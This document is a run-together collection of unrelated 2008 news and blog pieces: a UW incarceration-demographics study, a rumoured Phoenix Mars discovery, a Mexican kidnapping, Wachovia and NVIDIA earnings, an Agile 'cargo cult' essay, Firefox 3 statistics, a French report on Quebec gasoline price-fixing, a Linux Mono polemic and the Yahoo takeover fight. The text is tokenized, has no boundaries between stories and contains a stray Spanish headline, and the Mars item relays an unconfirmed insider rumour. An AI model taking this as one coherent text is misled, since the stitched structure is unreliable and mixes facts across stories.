Drawing data from a variety of sources that looked at prison and general populations , Becky Pettit , a UW associate professor of sociology , and Bryan Sykes , a UW post - doctoral researcher , found that the boom in prison population is hiding lowered rates of fertility and increased rates of involuntary migration to rural areas and morbidity that is marked by a greater exposure to and risk of infectious diseases such as tuberculosis and HIV or AIDS .
These effects are most heavily felt by low - skill black males , and she said the disproportionately high incarceration rates among African - Americans suggest the prison system is a key suspect in these demographic results .
Pettit said well - documented facts – one in 100 Americans is behind bars in 2008 , about 2.4 million people currently are incarcerated and nearly 60 percent of young black males who dropped out of high school have served time in jail – do n't seem to register with Americans .
" These kinds of rates were not historically true 30 years ago .
Today , we are giving people custodial sentences that we would n't have in the past for victimless crimes .
Our justice system has become more punitive , " she said , adding that most demographic data collection is decades behind the times and masks this racial disproportionality .
That 's because most surveys , which are federally funded , were begun in the 1960s and 70s and excluded the prison population , which was significantly smaller at that time .
In addition , she noted that the effects of an ever - growing criminal justice system extend beyond those who are serving sentences to include children , partners and even entire communities .
Among the findings outlined in Pettit 's presentation are :
-- Rates of positive or latent tuberculosis are 50 percent to 100 percent higher for inmates than for the general population .
The TB rate among black inmates is 14.6 percent compared to 8.4 percent for white inmates .
Despite substantial declines in the overall risk for TB in the U.S. , blacks are eight times more likely to contract the disease than whites .
-- Blacks both inside and out of prison have higher rates of HIV infection than whites .
Inmate rates for HIV are 3.5 percent for blacks and 2.3 percent for whites , although Pettit said this data is weak because many inmates have not been tested for HIV or will not say if they are HIV positive .
--
The number of black men living in rural , or non-metropolitan , areas increases dramatically when the inmate population is included because many jails and prisons are located in rural locations .
-- Rates of childlessness are higher for both black and white inmates than the general population .
Sixty - four percent of non-prison white men have children , but that number drops to 50.6 percent of jailed white men .
Among blacks , 71.7 percent of the non-prison men have children while 61.7 percent of those in jail are fathers .
The survey focused on African - Americans and non-Hispanic whites because earlier surveys did not collect data about such groups as Hispanics or Asian - Americans or because the sample sizes from these groups were too small to draw valid statistical judgments .
The study also only looked at men between the ages of 25 and 44 and broke them into three groups – high school dropouts , high school graduates and those with a college degree or some college education
Pettit said she hopes her work can be a springboard for better and more inclusive data collection that paints a more accurate demographic picture of the U.S. population .
" We usually do n't think of the prison system as something that is a policy shift .
But the public health risks and the effects on migration and fertility show that it has had fundamental consequences for all of us , " she said .
" It is in our own self - interest to be concerned .
And certainly from a fiscal standpoint we have an interest .
In times of financial difficulty , we have a fixed amount of money and for every dollar we spend on incarceration we have one dollar less to spend on education and other things .
This is a challenging public policy question . "

On Thursday , NASA held a press conference to announce that the recent TEGA experiment on board Phoenix had confirmed the presence of water in the Martian soil .
Whist exciting , Phoenix scientists were expecting that result .
However , behind the scenes , something else was being discussed and it had little to do with melting water …
Having just covered this story on the Universe Today , I ca n’t help but be intrigued .
Apparently , an undisclosed Phoenix scientist has been in communication with Aviation Week concerning a “ compelling ” discovery on the Red Planet .
What could this news be ?
Obviously it ’s something important as NASA and the University of Arizona are going to great lengths to keep the details out of the public domain .
Plus , Phoenix scientists have presented their preliminary findings to the Bush Administration ’s Presidential Science Advisor .
The report suggests that there has been an even more significant discovery from the robotic explorer , not only from the Thermal and Evolved Gas Analyzer ( or “ TEGA , ” the instrument used to bake Martian samples ) which confirmed the presence of water , but from the Microscopy , Electrochemistry , and Conductivity Analyzer ( MECA ) instrument .
MECA has apparently found even more evidence for the “ potential for life ” on Mars .
But this “ evidence ” will be the biggest discovery yet .
However , the Phoenix team need more time to analyse the complex data they ’ve received and will wait till mid-August at the earliest to make a press release .
Scientists are keen to point out that they have not discovered direct evidence for life on Mars ( after all , Phoenix is not equipped to do this ) , but the indication is this new data will be even more profound than the discovery of water .
As if that was n’t enough , it looks like they ’ve had to take this news to the top .
Advising the White House is a pretty big deal , so we ’ll just have to wait and see what Phoenix has uncovered …
For more on this exciting development , see The White House is Briefed : Phoenix About to Announce “ Potential For Life ” on Mars .
Lo que hace de un F1 una máquina realmente veloz
When their 14 - year - old son was snatched off the street by armed men in early June , the Marti family reportedly did what many wealthy Mexicans do in such a crisis .
The founders of a chain of sporting goods stores hired a private negotiator to deal directly with the kidnappers .
They said nothing to police or to the press .
They paid millions of dollars in ransom money .
Then they waited for a signal that the boy had been released .
It was not to be .
Fernando Marti ’s decomposed , bullet - riddled body was found Friday in the trunk of a stolen Chevy that had been abandoned in a working - class Mexico City neighborhood .
For many , Monday ’s news was equally bad : Authorities said they had arrested at least one city police commander in connection with the crime , and that other cops might be involved .
The possibility of police involvement comes at an awkward time for President Felipe Calderon , who has been waging a high - stakes war against violent drug cartels since taking office in December 2006 .
The campaign against drug gangs as well as other violent criminals has been repeatedly compromised by corrupt police officers , pushing Calderon to turn to the army .
As of June , 40,000 soldiers and 5,000 federal police were deployed nationwide .
The administration last week also launched a shake - up at the federal attorney general ’s office in response to the agency ’s ineffectiveness .
Officials said Monday that a prosecutor who oversaw extradition of drug traffickers had resigned , the second high - ranking official to leave the attorney general ’s office in a week .
Although Mexico City police say they do n’t think the gang that kidnapped Fernando was involved in the narcotics trade , many other kidnappers may be .
Under pressure from the federal crackdown , some gangs appear to be ratcheting up kidnapping and extortion to make up for shrinking drug profits .
“ The authorities knew that if they attacked the drug trafficking and took away that cash flow that the delinquents would look for something else , ” said Maria Elena Morera , head of a citizens anti-crime organization in Mexico City .
“ The tragic death of Fernando Marti symbolizes what many Mexicans are living through . ”
There is no question that kidnappings in Mexico are soaring , particularly in trafficking hot spots along the U.S. border , where criminals have found easy targets among business owners , doctors and other professionals who have prospered in the region .
Last year , 438 Mexicans were reportedly abducted , according to official government statistics .
That ’s a 34 % increase over 2006 .
But it ’s believed to be just a fraction of the true number .
Experts say many Mexicans are reluctant to contact police out of fear that officers are involved in the kidnapping and will harm their loved ones if they do n’t cooperate .
Tijuana is believed to suffer more kidnappings than any city in the world outside Baghdad , according to a global security firm that handles ransom negotiations south of the border .
Hundreds of residents have been abducted for ransom in recent years , according to victim support groups .
The arrival of thousands of federal troops has helped fracture drug cartels and in some cases sent them in search of new avenues to make money .
Heavily armed gunmen , often posing as police or working in tandem with crooked cops , have snatched people from shopping centers , restaurants and parking lots .
They imprison their victims in networks of safe houses , shackling and blindfolding them .
Kidnappers sometimes amputate their victims ’ fingers or ears and send them to family members to terrify relatives into paying up .
“ The crime of kidnapping is one of the most painful because it affects the victim , the families and friends , ” said Morera , whose husband was kidnapped .
He survived the ordeal , but had several fingers sliced off .
The surge in kidnappings has motivated thousands of well - to - do Mexicans to flee the country or surround themselves with security .
That was apparently the case with the Marti family .
Fernando ’s father , Alejandro , is a well - known businessman who founded a popular sporting goods chain and a string of fitness centers .
A self - made entrepreneur , he got his start hawking T - shirts during Mexico City ’s 1968 Olympics .
Authorities have released almost no information about the Marti case .
But according to press reports , Fernando was riding in a car with a driver and a bodyguard on June 4 when the group was pulled over by men who they thought were police .
Armed men killed the adults at the scene and abducted the boy .
One press report said the family paid $ 6 million for the boy ’s release and waited in agony after the kidnappers stopped communicating with them .
The news the Martis had dreaded came Friday when residents of a tough Mexico City neighborhood reported a noxious smell coming from a silver subcompact parked on a residential street .
Police found Fernando ’s body in the trunk .
He had been shot several times .
Forensic experts said he may have been dead for as long as a month .
More than 800 kidnap victims have been killed in Mexico since 1970 , according to Jose Antonio Ortega Sanchez , president of another citizens anti-crime group , who added that the mayhem was shaking the country to its foundations .
“ Here ’s the problem : the corruption , the collusion and the involvement of the authorities .
. . .
If Calderon ca n’t clean up his own security agencies , he ’s not going to be able to advance , ” he said .
Fernando was buried Sunday .
A front - page photo in the national daily Reforma showed a black hearse followed by a procession of luxury cars .
There were so many flowers , according to one report , that they had to be transported to the cemetery in a cargo truck .
The pages of the capital ’s newspapers overflowed with sympathy announcements from the family ’s business associates and friends , as well as angry letters to the editor .
“ Mexico is submerged in an abyss of blood and uncertainty , inconceivable and interminable , ” read one .
Mexico City police on Monday identified the arrested police commander as Jose Luis Romero Jaimes , but provided no other information about him .
Also taken into custody was Marco Antonio Moreno Jimenez .
News reports had originally identified Moreno Jimenez as a member of the federal police , but capital authorities denied that .

Aug. 5 , 2008  --
A farmer has erected a backyard fence made of three old cars sticking up in the air to send a message to new neighbors that he can do whatever he wants on his property .
" This is just a fun way for me to say , ` Hey boys , I 'm still here , " ' Rhett Davis said .
" This is my redneck Stonehenge . "
Davis came up with the idea after neighbors who recently moved into homes next to his hayfield complained about his farm .
" The people who bought the homes say , ` Well , we love looking into your yard and seeing the horses and the cattle , but we do n't like the flies , and we do n't like the mosquitoes , ' and when I cut my field to bale it , they say , ` We do n't like the dust in the air , ' " Davis said .
Neighbors declined to comment to the Standard - Examiner of Ogden .
Davis said he offered to pay for half the cost of a fence between his property and the others and to build it .
He said his neighbors declined the offer , saying it would block their view .
Davis said he used a backhoe to dig three large holes on the edge of his property , then took three cars that had competed in demolition derbies and planted them nose - first into the ground .
He said the cars were planted out of humor rather than spite .
He stressed that it 's important for new residents to realize that Hooper is a farming community .
" I respect that they 're here and spent a lot on their homes , but on the other hand , give me a little bit , too , " Davis said .
" I 've been here since I was 7 years old . "
He said he does n't intend to keep the cars up permanently .
" These can come out just as easy as they went in , " Davis said .

CHARLOTTE  Wachovia ( WB ) reported a surprisingly large second - quarter loss Tuesday , deflating Wall Street 's hopes that the nation 's big banks are weathering the credit crisis well .
The bank said it lost $ 8.86 billion , is slashing its dividend and eliminating 10,750 positions after losses tied to mortgages soared .
Even excluding one - time items , the results missed analysts ' estimates .
But by the afternoon its stock joined a modest Wall Street rally and rose as much as 13 % — after its shares sank to mid-1991 levels in premarket trading , and after Wachovia 's new CEO said he plans to cut $ 2 billion of expenses by the end of next year and sell parts of the fourth - biggest U.S. bank .
" Our reported results today are clearly a disappointing performance for which we take responsibility , " said Wachovia Chief Executive Bob Steel on a conference call with analysts .
" We are serious about getting on top of these issues quickly and we believe we have a good grasp of the challenges facing the economy , the industry and Wachovia . "
Three rating agencies — Moody 's Investors Service , Standard & Poor 's and Fitch Ratings — downgraded their ratings on Wachovia 's debt , citing increased expectations of losses in the bank 's mortgage portfolio and its reduced flexibility to raise new capital .
Wachovia said it lost the equivalent of $ 4.20 a share in the April - June period .
In the same timeframe last year , the bank earned $ 2.34 billion , or $ 1.22 a share .
Excluding $ 6.1 billion in write - downs to the value of its intangible assets and merger - related and restructuring charges of $ 128 million , Wachovia lost $ 2.67 billion , or $ 1.27 a share .
Second - quarter results include the bank 's October acquisition of A.G. Edwards , which the bank said the merger is proceeding as planned and is 40 % complete .
Analysts on average expected a loss of 78 cents a share on revenue of almost $ 8.4 billion .
Earlier this month , the bank had projected a $ 2.6 billion to $ 2.8 billion quarterly loss , equal to $ 1.23 to $ 1.33 a share , excluding goodwill items .
" Wachovia 's new management has pulled its head of out the sand and is fully acknowledging the problems not challenges , " said Bart Narter , senior analyst at Celent , a Boston - based financial research and consulting firm .
" While the company 's wealth management , corporate and investment banks , and capital management groups all had more encouraging results than the general bank , the general bank is the bulk of Wachovia and it is n't performing well . "
Wachovia cut its quarterly dividend to 5 cents a share from 37.5 cents , which will conserve approximately $ 700 million of capital per quarter .
In April , Wachovia slashed its dividend 41 % .
Steel , who replaced ousted Ken Thompson earlier this month , said it was " clearly prudent and necessary " to further cut the dividend .
" While this is a difficult decision , it is the best course for our shareholders over the long term , " he said .
Steel said the company is moving to " sell selected non-core assets " and reduce the number of business customers who only use the bank for loans rather than other services .
Wachovia expects to cut expenses during the second half of this year by $ 490 million and then reduce 2009 spending by $ 1.5 billion .
As part of that plan , Wachovia said it would lay off 6,350 workers , affecting more than 5 % to fits roughly 120,000 employees .
A majority of those jobs will come from the mortgage area , Steel said .
Wachovia also said it will also eliminate 4,400 open positions and contractors .
The bank has already cut 2,000 retail mortgage jobs , it said .
During the quarter , the Wachovia boosted its provision for loan losses to $ 5.57 billion from $ 179 million a year ago , and added $ 4.2 billion to its reserves for bad loans .
Results also included a $ 975 million charge related to the tax treatment of leveraged leases , $ 936 million of losses from disrupted capital markets , a $ 590 million charge for other legal matters , and $ 391 million of losses on securities sales .
Wachovia 's current problems stem largely from its acquisition of mortgage lender Golden West Financial in 2006 for roughly $ 25 billion at the height of the nation 's housing boom .
With that purchase , Wachovia inherited a deteriorating $ 122 billion portfolio of Pick - A - Payment loans , Golden West 's specialty , which let borrowers skip some payments .
Wachovia 's increase in loan loss reserves included $ 3.3 billion related to the " Pick - a - Payment " mortgage portfolio .
In April , the bank tightened underwriting standards , and last month it stopped offering an option on " Pick - A - Payment " loans that let borrowers pay less than the interest owed .
On Monday , Wachovia said it will stop offering home loans through brokers .
Wachovia said it is setting aside $ 10.96 billion for credit losses , up from $ 6.77 billion in the first quarter and $ 3.55 billion a year earlier .
Net charge - offs , loans it does n't think are collectable , increased more than eight - fold from a year earlier to $ 1.31 billion .
Profits in consumer and business banking , Wachovia 's largest unit , fell 23 % to $ 1.12 billion , hurt by rising credit costs , mainly for mortgages .
The corporate and investment banking unit had a $ 209 million profit , down 73 % , reflecting write - downs tied to subprime mortgages , commercial mortgages , non-subprime debt and consumer mortgages .
Capital management profit fell 5 % to $ 297 million , hurt by the liquidation of an Evergreen Investments fund , while wealth management profit rose 9 % to $ 98 million .

Software development is prone to fads , going back to the days of " goto Considered Harmful . "
One current fad goes under the general name of " Agile methods ; " some of its variants are extreme programming , the SCRUM methodology and Alastair Cockburn 's Crystal Clear Methodology .
Now , I 'm the last guy to run down Agile methodologies , but ... let me tell you a story .
About two years ago , I joined a project to build an appliance to Do A Good Thing .
I 'm changing the names and details to protect , well , primarily me , but innocents were involved .
In any case , the details of what we were doing are unimportant ; what matters is how we did it .
All of us team members were survivors of another much larger project .
That project had been done with outsourcing to a CMM Level 5 organization , with great care in the methodology at our end and with careful detailed project management overall .
The project consumed tens of millions of dollars and years of overtime .
It failed utterly .
The whole experience was traumatic .
None of us wanted to repeat it .
Some of us advocated adopting Agile methods , which had generated plenty of good reports .
Since it was clear that the last thing anyone would have said about the last project was that it was " agile , " adopting Agile seemed like a good idea .
We could n't adopt an Agile methodology whole , though .
We had to adapt to our corporate environment .
User stories or use cases sounded like a great idea ; we 'd do use cases .
Continuous integration would be great .
Incremental development was a good idea too , so we 'd do that .
And extreme programming uses a morning " stand up meeting , " which some of us had used before ; we'd have a standup meeting .
The problems started when we tried to integrate these methods into our existing environment .
First , management demanded that we estimate — and commit to — a schedule and budget .
You can't do that without knowing what you 'll be doing , so we built our use cases and created a schedule .
Several months later , we had hundreds of use cases , and the local Microsoft Project wizard had a schedule estimated down to the day .
The schedule ran for more than a year .
We wanted to do incremental deliveries , but " making a delivery " into the rest of the organization required additional effort .
There was no scheduled time for that either ; besides , it was silly to go through all that effort repeatedly .
The schedule ended up with four increments , months apart .
Of course , as the months went by , we learned more about the problem , and we had changes requested ; that meant more use cases and more effort .
We slipped the schedule somewhat , but there was a lot of whining in upper management about how we 'd made commitments , so why could n't we keep them ?
Besides , time to market was critical .
We based the project on an existing purchased code base , so the initial builds came relatively easily .
However , we had n't really allocated any effort in the schedule to the actual build and continuous integration support — we 'd assumed the build would be right the first time .
We also budgeted for a full - time system administrator , but then we lost the position , so we 'd just have to make do on our own .
Of course , system administration was n't on the schedule either , but by now we 'd committed , and commitments are important .
End result :
We used up the slack in the schedule .
We had arrived at an " Agile project " in which we did all the requirements up front and committed to them , had a " let 's pretend " schedule that allocated time for a year in advance but did n't recognize all the tasks that were needed , and delivered our increments months and months apart .
Now this project was a " success . "
We delivered on time ( at least after the last big slips ) , and the product is shipping .
It just required major slips , big cost overruns and a month of seven - day weeks and 16 - hour days .
Over the year - end holidays .
We did n't have an Agile project at all :
What we had was an Agile methodology cargo cult .
Cargo cults developed in Melanesia , starting in the 19th century , but really grew during World War II .
To the locals , the war meant cargo planes and cargo ships arriving , carrying everything from canned pineapple to Quonset huts .
And it was good .
Then the war ended , and the cargo stopped .
The locals responded by building their own runways , with airplanes made of bamboo and palm fronds , in hopes of attracting it back .
We heard that Agile methods were good , so we adopted Agile methods .
But we managed to apply them in such a way that we actually built the project in a top - down , waterfall death march .
Now , class , what have we learned from this ?
The first lesson :
After a traumatic experience , people are willing to try almost anything to make things better — except actually to change .
Change is hard .
A lot of the techniques we ended up applying , like end - to - end " committed " schedules , were things that let management pretend they were in control .
Second lesson : Watch out for cargo cults .
Agile methods are agile .
If you have hours of meetings , a three - month increment , if you have to commit to a fixed set of deliverable functionality and a firm schedule months in advance , you 're doing a waterfall project , or nearly so .
Even if you call the requirements " use cases " and call the meetings " stand ups . "
Most important lesson : Reality is your friend .
Sometimes , your friends tell you hard things .
If you think you 're doing Agile , you must step back every so often and ask : Can I respond to changing requirements easily ?
Do I have confidence that I could run the current build and see part of the system work ?
Am I seeing my family on a regular basis ?
Or did we plan to work overtime over Christmas to make our commitments ?
If you are n't seeing easy response to change , regular working deliveries and a regular schedule with a normal workweek , you have a cargo cult .
The saddest thing about cargo cults ?
The palm frond planes never actually delivered the canned pineapple .

The above graph shows daily Firefox 3 usage rates among visitors to city - data.com as determined from Google Analytics in the two weeks since the Firefox 3.0 Download Day .
City - data.com is very large website with 8.7 million unique monthly visitors ( ranked 143rd largest in the U.S. by Quantcast ) with 93 % of them coming from the U.S.
It is frequented by " mainstream " visitors .
According to Quantcast , the only significant demographic variance is fewer visitors ages 17 and below than average .
Higher Firefox usage during weekends is caused by higher share of home - based as opposed to work - based users .
The jump caused by Mozilla 's " Download Day " world record is clearly visible .
Beta and Release Candidate versions of Firefox 3 were used by almost 1 % of visitors even before the official version was made available .
As can be seen in this weekly graph , both Firefox and Safari have been steadily increasing their market share during the last few months in 2007 and 2008 .
Internet Explorer 6 continues its decline , but it is still used by a significant number of people .
Most of the Firefox 3 market share gains of the last two weeks have come from existing Firefox 2 users , not yet from converts from other browsers .
This report has been created because we found that other existing reports on Firefox 3 usage do not give a representative real - world data on the U.S. browser market share ( using browser share skewed by tech - oriented sites , not separating U.S. market share , not specyfing the source of data , using E - commerce sites with a lot of visitors coming from paid ads that are not seen by Adblock users , etc ) .

Des accusations criminelles de collusion sont portées relativement à la fixation du prix à la pompe dans quatre villes du Québec .
Le Bureau de la concurrence du Canada annonce que des accusations criminelles sont portées relativement à la fixation du prix de l'essence à la pompe dans quatre villes du Québec .
Ces accusations touchent 13 individus et 11 entreprises accusés d'avoir fixé le prix de l'essence à Victoriaville , à Thetford Mines , à Magog et à Sherbrooke .
Trois entreprises et un individu ont déjà plaidé coupables devant la Cour supérieure du Québec , à Victoriaville .
La fixation des prix prive les consommateurs des avantages d'un marché concurrentiel , par exemple un prix plus bas .
La commissaire de la concurrence Sheridan Scott
Les entreprises et individus qui ont plaidé coupables devront payer des amendes totalisant plus de 2 millions de dollars .
Ces entreprises sont Les Pétroles Therrien Inc. , qui exploite sous la bannière Pétro - T , et Distributions pétrolières Therrien Inc. ( 179 000 $ ) , de même qu'Ultramar Ltée ( 1 850 000 $ ) .
Jacques Ouellet , employé d'Ultramar , a plaidé coupable et a été condamné à payer une amende de 50 000 $ .
Un autre employé d'Ultramar est visé par une poursuite , mais n'a pas encore enregistré de plaidoyer .
Ceux qui ont plaidé coupables ont accepté de collaborer à l'enquête , qui aura duré deux ans , de 2005 à 2007 .
Il y a eu beaucoup d'écoute électronique , plusieurs perquisitions et la collaboration d'entreprises , a déclaré la commissaire Sheridan Scott .
« Des détaillants d'essence ou leurs représentants se téléphonaient et s'entendaient sur le prix demandé aux consommateurs pour l'essence dans les marchés visés .
Il est allégué que la grande majorité des détaillants d'essence dans ces marchés ont participé au cartel » , a -t - elle dit .
Si le montant de la fraude n'a pu être calculé précisément , Mme Scott a indiqué que l'ajout de 1 ¢ le litre dans les quatre marchés représentait 2 millions de dollars pour la période touchée .
« L'annonce aujourd ' hui envoie un message très clair que le Bureau de la concurrence agit contre ceux qui fixent les prix » , a -t - elle ajouté .
Ultramar Ltée a annoncé , dans un communiqué , jeudi , qu'elle ne contestera pas les accusations , qu'elle se conformera aux directives du Bureau de la concurrence et qu'elle prendra les mesures nécessaires pour que ça ne se reproduise plus .
La pétrolière ajoute que « tout nous porte à croire que [ les employés concernés ] n'ont tiré aucun avantage pécuniaire personnel de leurs gestes dénoncés par le Bureau de la concurrence ».
De son côté , le porte - parole des Pétroles Therrien , Gilles Corriveau , se défend en indiquant que son entreprise a collaboré avec le Bureau de la concurrence , que l'enquête est le fruit de certaines circonstances et que les employés de l'entreprise se sont toujours fait un devoir de bien servir la clientèle .
Le Bureau de la concurrence poursuit son enquête sur la fixation des prix de vente de l'essence dans d'autres marchés au Canada .
Un cartel Le fait pour au moins deux personnes de s'entendre pour empêcher ou réduire indûment la concurrence , comme dans le cas où des concurrents s'entendent pour fixer les prix , constitue une infraction criminelle .
Les participants à un cartel sont passibles d'un emprisonnement maximum de cinq ans ou d'une amende maximum de 10 millions de dollars , ou d'une combinaison des deux .
( Source : Bureau de la concurrence )
Le président de l'Association pour la protection des automobilistes , Georges Iny , se dit très heureux de la mise à jour du cartel , mais ne se réjouit pas outre - mesure , car « ça n'explique pas pourquoi l'essence est 25 ¢ plus chère que l'année dernière ».
Il ajoute que le montant de la fraude ne constituait pas une très grosse somme pour chaque consommateur , « la moyenne au Québec , dans les dernières années , pour les détaillants , la marge se situe entre 4 ¢ , 5 ¢ et 6 ¢ le litre .
Alors ça ne peut pas être 25 ¢ le litre .
C'est un petit montant , mais ajouté sur chaque litre , en fin d'année , pour un détaillant , ça peut lui amener des revenus supplémentaires , entre 20 000 $ et peut - être 50 000 $ par détaillant . »

NVIDIA has published its results for the second quarter of fiscal 2009 .
The company 's performance fell short of previous expectations for multiple reasons , and NVIDIA 's forecast for the third quarter is n't much brighter , with projected sales below seasonal levels .
NVIDIA reported revenue of $ 892.7 million for the second quarter , a decrease of some 5 percent .
The company dipped into the red this quarter , with an operating loss of $ 120.9 million ( 22 ¢ per share ) .
The single most important factor that contributed to that loss , of course , is the $ 196 million warranty charge NVIDIA admitted it was taking a month ago .
The company fielded several questions regarding the size and nature of that problem and once again reiterated that the manufacturing issue in question affected a relatively small batch of parts , that the company remains fully committed to repairing those parts , and is working closely with all of its OEM partners .
When asked whether or not it believed the problem had affected other GPUs , expected additional costs , or predicted design losses as a result of the issue , NVIDIA said no .
Based on the company 's profile of the flaw , the one - time $ 196 million charge will cover it .
A challenging market
NVIDIA could have potentially tried to blame its quarterly loss entirely on that one - time charge , but the company declined to do so .
Instead , it presented a very candid picture of its own weak performance during the quarter and the multiple challenges it faced .
One problem , according to the company , was that it had " underestimated its competitor , " and had mispositioned its new product introductions .
This issue has since been corrected , and the GTX 260 / GTX 280 are now far more accurately positioned against the HD 4800 series from ATI than they were when those products launched .
Weak sales in the second quarter drove up inventory levels , and greater - than - expected inventory levels , in turn , have slowed NVIDIA 's transition to 55nm .
NVIDIA CEO Jen - Hsun Huang claimed that the transition to 55nm technology is ongoing , but that we wo n't see these cards across the market until existing 65 nm supplies have been depleted .
The weak US dollar drove US OEM sales in European markets , but it also weakened the sales performance of native European manufacturers .
NVIDIA claims this substantially impacted its business , as desktops in Europe have a substantially higher GPU attach rate than their American counterparts .
Huang pulled no punches in his evaluation of the company 's second quarter .
" Our second quarter financial performance was disappointing , " he said .
" The
desktop PC market around the world weakened during the quarter , and our miscalculation of competitive price position further pressured
our desktop GPU business .
We have a great product line - up , and having taken the necessary pricing actions , we are strongly
positioned again .
Our focus now is to drive cost improvements and to further enhance our competitiveness through the many exciting
initiatives we have planned for the rest of the year . "
He then added , " In contrast , the rest of our businesses did not exhibit the same dynamics as our desktop business .
The notebook GPU , MCP , and Professional Solutions groups grew a combined 27 percent year - over - year .
Though we approach the near term with caution , we remain very optimistic about the expanding universe of visual computing and the exciting growth opportunities made possible by CUDA , our general purpose parallel computing architecture . "
No plans for UMPCs
CUDA , Tegra , and mobile Internet Devices ( MIDs ) were all hot topics this afternoon .
Huang was dismissive of the UMPC market , implying that NVIDIA has no plans to compete in such a space , but talked extensively on how MIDs are the future of computing .
The company is also putting a massive amount of weight behind CUDA , which it apparently envisions as the software engine that will power adoption of NVIDIA GPUs within everything from MIDs to supercomputers .
None of NVIDIA 's forward - looking statements touched on NV70 or any particular aspect of a next - generation architecture , but focused entirely on massively parallel computing and the ways in which the current generation of GeForce products can be adapted to deliver tremendous performance increases .
NVIDIA plans to address its revenue shortfall by significantly cutting operating expenditures , which ballooned by 34 percent year - on - year , and believes strong sale of its 55nm products will improve the situation .
The company does not believe it lost market share in its second fiscal quarter , and while it forecast a tough third quarter , it said nothing about a long - term stay within the red zone .
Barring further one - time charges , the company may quickly return to profitability ; take away that charge and NVIDIA pops back into the black by some $ 60 million .
As for the rumors and allegations of widespread GPU / chipset failures , NVIDIA has now denied them in its quarterly earnings report .
If the company 's statements are accurate , there 's absolutely nothing to them .
If the company is lying about the scope or nature of the problem , it 's opening the doors to potential shareholder lawsuits .
Personally , I 'm ready for this topic to go away .
The scope of the allegations continues to expand , proof remains nonexistent , and NVIDIA has now officially stated that the scope and nature of the problem is confined to a relatively small batch of parts — which , incidentally , is what it has been saying all along .
Linux : Powered by Microsoft ?!?!
A
month ago we showed Fedora crossing out Moonlight and moving Tomboy ( with Mono ) out of the way , at least as far as the Live CD is concerned .
So does Debian on the face of it .
Watch this :
* tomboy : very nice app , but controversial since it brings the
full Mono stack , so we do n’t make it part of
gnome - desktop - environment .
The background of this is that gnome / gnome - desktop - environment metapackages tend to syncronize with upstream GNOME ( and this is why they dragged tomboy in when installed ) .
However , tasksel ( i.e. Debian Installer ) did n’t include tomboy in the default setup .
The necessary harmonisation between GNOME metapackages and tasksel turned out to be in favour of removing tomboy from metapackages instead of adding it to tasksel , because Mono is widely seen as “ controversial ” ( see above ) .
This makes it much less likely that tomboy becomes part of the default install in the future .
It ’s important because Debian is one of the most influenctial Free software distributions available .
Even Ubuntu is based on it and Ubuntu seems to be deep in Mono with the approval of Mark Shuttleworth .
Could his mind be changed ?
Getting a technical dependency out of the way is different from availability and habitual dependence .
There are some other concerns about people getting ‘ addicted ’ to specific Mono applications because distributors encourage their use through inclusion and / or preinstallation .
Just the other day in Miguel de Icaza ’s blog :
My friend Mirco Bauer has been maintaining and coordinating the Mono packaging for Debian for many years .
It now turns out that Tomboy has found its way into Firefox in the form of an addon .
Tomfox is a very cool Firefox extension .
With Tomfox , you can directly create Tomboy notes in Firefox .
Whenever the question arise about Mono , Jeff Waugh and others attack the messenger .
in fact , Sam Varghese has just complained about these attacks , which may only mean that he was on the right topic all along .
I ’ve grown quite used to people from the GNOME Foundation indulging in this kind of attack .
I ’ve lost count of the number of times the foundation ’s media spokesman Jeff Waugh has launched personal attacks on me ; GNOME co-founder Miguel de Icaza followed suit a few months back .
What are they so afraid of ?
The only thing Mono critics are afraid of are the known impact of .NET patents and the gradual move of GNOME / GTK to the # .
Watch what Beranger has just had to say :
Let ’s revisit the GTK +
3.0 issue , this time based on what Miguel de Icaza had to say about it .
Indeed , « there is no actual plan for which features will be added , and when these features will be added » , but I do n’t feel de Icaza should be let have a say in the planning of the future GTK +
3.0 and GNOME 3.0 — or else it will become “ Mono Reloaded ” within months ! [...]
Looking for some stupid Microsoft patents on a “ System and method for activity monitoring and reporting in a computer network ” ?
Here you are : Patent # 6519639 , Patent # 6631412 , Patent # 7337223 , Application #10/629,954 .
One of the other dilemmas in the Debian project is also multimedia codecs , so the following new article is worth seeing .
Over 100 million DVD players have shipped in the US , and 100s of millions of mp3 players have shipped , yet Linux distributions like Fedora , Ubuntu and Opensuse do n’t include software to create files that these devices can play .
The reason is because implementations of the MPEG - 2 and MPEG - 1 Audio Layer 3 ( MP3 ) are considered patented so the Linux Distributors are avoiding a risk of patent infringement lawsuits .
I went searching for answers to basic questions like what are all the patents claimed for MP3 and when do the claimed MPEG - 2 patents expire and I did not find these on the web , so I decided to create this summary of the patent status of MPEG - 1 , H.261 and MPEG - 2 .
I ’m not a lawyer and I ’m not an expert on video or audio compression so there are probably some mistakes in this , but its better than anything I ’ve found on the internet .
This article is US specific , but the patent databases listed usually have other countries patents listed as well .
As stressed several times before , it ’s not the patent ( s ) itself that needs to be considered in isolation ; it ’s the holder of the patent too .
Other than Microsoft ( and SCO maybe ) , no other company is aggressive enough to attack the work of volunteers with a FUD campaign , let alone legal action ( with the possibility of proxies like Intellectual Ventures of Acacia , which host Microsoft employees [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 ] ) . █

NEW YORK ( Reuters ) - Yahoo
Inc may have played its top two cards by pulling out possible deals with AOL and Google , but it does not seem to have changed Wall Street ’s view that Microsoft will eventually win the takeover battle .
Yahoo announced on Wednesday a test to outsource Web search advertising to Google Inc .
Sources say the test is part of a planned three - way alliance to combine Yahoo with Time Warner Inc ’s AOL instead of Microsoft Corp .
But hours later , the world ’s largest software company appeared to trump Yahoo ’s announcement as the New York Times reported that Rupert Murdoch ’s News Corp was in talks to join Microsoft ’s $ 42.3 billion bid for the Web pioneer .
“ Everyone is just exploring .
The best option is to accept the Microsoft deal , ” said fund manager Mike Binger at Thrivent Financial in Minneapolis , which owns small stakes in Yahoo and Microsoft .
Binger said an AOL - Yahoo merger made no sense .
“ I just see Yahoo as a mature brand and AOL as a declining brand , ” he said .
As of December 31 , Thrivent owned about 1.5 million Yahoo shares , or 0.11 percent , and about 6.3 million Microsoft shares , or 0.07 percent , according to regulatory filings .
Yahoo shares rose nearly 3 percent on Thursday to close at $ 28.59 , while Microsoft rose 0.8 percent to $ 29.11 .
Microsoft ’s cash - and - stock offer now values Yahoo at $ 29.33 per share , which the Web company rejects as too low .
But before Wednesday , Yahoo appeared to have run out of alternatives to Microsoft , which has threatened to lower its bid if it was not accepted within three weeks .
Yahoo is now nearing a deal with Time Warner to fold AOL , excluding its dial - up Internet access business , into a combined company , sources familiar with the talks said on Wednesday .
